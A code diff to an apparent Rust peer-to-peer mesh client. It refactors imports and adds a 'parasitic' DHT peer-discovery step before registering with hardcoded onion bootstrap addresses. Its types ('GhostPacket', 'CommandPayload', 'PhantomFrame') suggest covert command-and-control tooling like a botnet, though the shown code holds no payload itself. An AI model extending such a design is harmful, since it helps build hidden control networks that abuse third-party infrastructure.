@@ -6,8 +6,8 @@ use lru::LruCache;
 use std::num::NonZeroUsize;
 use protocol::{MeshMsg, PeerInfo, GhostPacket, CommandPayload, GossipMsg, Registration};
 use protocol::quic::PhantomFrame;
-use crate::common::crypto::load_or_generate_keys;
-use crate::utils::paths::get_appdata_dir;
+use crate::config::crypto::load_or_generate_keys;
+use crate::helpers::paths::get_appdata_dir;
 use crate::p2p::transport::{QuicPool, make_client_config};
 use crate::p2p::dht::{RoutingTable, InsertResult};
 use rand::seq::SliceRandom;
@@ -47,12 +47,26 @@ pub async fn start_client(bootstrap_override: Option<String>) -> Result<(), Box<
         keypair: identity.keypair.clone(),
     }));
 
-    use crate::common::constants::BOOTSTRAP_ONIONS;
-    let peers = if let Some(p) = bootstrap_override {
+    use crate::config::constants::BOOTSTRAP_ONIONS;
+    let mut peers: Vec<String> = if let Some(p) = bootstrap_override {
         vec![p]
     } else {
         BOOTSTRAP_ONIONS.iter().map(|s| s.to_string()).collect()
     };
+    
+    // 5. Parasitic Peer Discovery (Edge Role)
+    use crate::discovery::parasitic::ParasiticDiscovery;
+    let discovery = ParasiticDiscovery::new();
+    match discovery.edge_role_find_peers().await {
+        Ok(found_peers) => {
+             for peer in found_peers {
+                 // Convert SocketAddr to String (simplification, real logic might need onion conversion or direct IP usage)
+                 // Note: DHT returns IP:Port. Mesh Nodes listening on QUIC IP:Port.
+                 peers.push(peer.to_string());
+             }
+        }
+        Err(e) => eprintln!("DHT Discovery Error: {}", e),
+    }
 
     for bootstrap_addr in peers.iter() {
          println!("Attempting to register with: {}", bootstrap_addr);
